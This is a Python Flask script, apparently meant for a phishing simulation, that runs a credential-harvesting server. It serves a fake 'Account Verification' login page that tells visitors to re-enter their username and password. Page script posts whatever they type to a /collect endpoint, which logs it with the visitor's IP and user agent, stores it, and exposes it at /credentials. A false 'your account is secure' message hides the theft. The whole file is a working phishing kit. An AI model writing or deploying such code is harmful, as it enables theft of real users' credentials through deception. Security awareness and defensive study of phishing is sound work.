#!/usr/bin/env python3
"""
Credential collection server - Simulate C2 server receiving credentials stolen by phishing attacks
"""

import json
import time
from datetime import datetime
from flask import Flask, request, jsonify
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Store collected credentials
collected_credentials = []

@app.route('/phish', methods=['GET'])
def phishing_page():
    """Phishing page"""
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Account Verification - Please Login</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
            .login-form { max-width: 400px; margin: 0 auto; padding: 20px; border: 1px solid #ccc; background: white; border-radius: 5px; }
            input { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; border: 1px solid #ddd; border-radius: 3px; }
            button { width: 100%; padding: 10px; background: #007cba; color: white; border: none; cursor: pointer; border-radius: 3px; }
            button:hover { background: #005a87; }
        </style>
    </head>
    <body>
        <div class="login-form">
            <h2>Account Verification</h2>
            <p>To ensure your account security, please re-verify your login information:</p>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Username/Email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit">Verify Account</button>
            </form>
        </div>
        <script>
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                var username = document.getElementById('username').value;
                var password = document.getElementById('password').value;
                
                // Send credentials to collection server
                fetch('/collect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        username: username,
                        password: password,
                        timestamp: new Date().toISOString()
                    })
                }).then(response => response.json())
                .then(data => {
                    alert('Verification successful! Your account is secure.');
                });
            });
        </script>
    </body>
    </html>
    """
    return html

@app.route('/collect', methods=['POST'])
def collect_credentials():
    """Receive credentials stolen by phishing attacks"""
    try:
        data = request.get_json() or request.form.to_dict()
        
        # Record credentials
        credential_data = {
            'timestamp': datetime.now().isoformat(),
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', 'Unknown'),
            'credentials': data
        }
        
        collected_credentials.append(credential_data)
        
        logger.info(f"Received credentials: {data}")
        
        # Return success response (simulate normal login page)
        return jsonify({
            'status': 'success',
            'message': 'Login successful'
        }), 200
        
    except Exception as e:
        logger.error(f"Error processing credentials: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/credentials', methods=['GET'])
def get_credentials():
    """Get all collected credentials (for debugging)"""
    return jsonify({
        'count': len(collected_credentials),
        'credentials': collected_credentials
    })

@app.route('/health', methods=['GET'])
def health_check():
    """Health check"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'collected_count': len(collected_credentials)
    })

if __name__ == '__main__':
    logger.info("Starting credential collection server...")
    app.run(host='0.0.0.0', port=9000, debug=False) 